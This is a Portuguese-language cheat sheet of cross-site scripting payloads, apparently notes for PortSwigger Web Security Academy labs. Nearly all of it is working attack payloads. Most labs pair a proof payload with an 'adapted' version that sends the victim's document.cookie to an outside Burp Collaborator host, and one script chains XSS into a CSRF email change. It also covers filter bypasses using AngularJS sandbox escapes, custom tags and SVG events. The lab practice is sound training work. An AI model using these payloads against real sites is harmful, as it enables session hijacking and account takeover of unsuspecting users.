# XSS - Cross-Site Scripting

Se você ver um campo de busca (search) ou um seção de comentários, busque por XSS.

Se tudo estiver sendo encodado, provavelmente o parâmetro não está vulnerável a XSS.

Payload genérico para XSS:
```
<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
```

<br>

Encontrou XSS?

Adapte o payload para roubar o cookie da vítima, por exemplo:

Em vez:
```
<script>alert(1)</script>
```

Teste com:
```
<script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```

> [!TIP]
> Pratique essa adaptação de payload nos labs. Se o cookie estiver com a flag HTTPOnly ativada, o payload com `document.cookie` não vai funcionar. Remova esse trecho e teste enviando uma request qualquer para o Collaborator para ver se a estrutura está correta.

<br>

## Laboratórios

> [!NOTE]  
> Alguns payloads finais não estão encodados em URL. Lembre de fazer isso caso ele não funcione sem encodar.

<br>

**DOM XSS in document.write sink using source location.search inside a select element**
```
storeId=test"></select><script>alert(1)</script>
```

Versão adaptada:
```
"></select><script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```

<br>

**DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**
```
{{constructor.constructor('alert(1)')()}}

OU

{{$on.constructor('alert(1)')()}}
```

Versão adaptada:
```
{{constructor.constructor('document.location="http://burp.oastify.com?c="+document.cookie')()}}
```

<br>

**Reflected DOM XSS**
```
\"-alert()}//
```

Versão adaptada:
```
\"-fetch('http://burp.oastify.com?c='+btoa(document.cookie))}//
```

<br>

**Stored DOM XSS**

A função vulnerável remove somente os primeiros angle brackets.
```
<><img src=1 onerror=alert(1)>
```

Versão adaptada:
```
<><img src=1 onerror="window.location='http://burp.oastify.com/c='+document.cookie">
```

<br>

**Exploiting cross-site scripting to steal cookies**
```
<script>document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</script>
```

<br>

**Exploiting XSS to perform CSRF**
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() 
{    
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];    
var changeReq = new XMLHttpRequest();    
changeReq.open('post', '/my-account/change-email', true);    
changeReq.send('csrf='+token+'&email=test@test.com')};
</script>
```

<br>

Reflected XSS into HTML context with most tags and attributes blocked

Utilize o Intruder para testar todas as tags utilizando [esse cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet). Depois de descobrir a tag, faça o mesmo processo para os eventos.
```
<iframe src="https://0a61001b0306cecac0be0a5000570086.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

Versão adaptada:
```
<script>
location = 'https://exploit-server.web-security-academy.net/?query=<body onload=document.location='https://burp.oastify.com/?c='+document.cookie tabindex=1>#x';
</script>
```

<br>

**Reflected XSS into HTML context with all tags blocked except custom ones**
```
<script>
location='https://kek.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
```

Versão adaptada:
```
<xss id=x onfocus=document.location="http://burp.oastify.com/?c="+document.cookie tabindex=1>#x
```

Reflected XSS with some SVG markup allowed
```
<svg><animatetransform onbegin=alert(1)> 
```
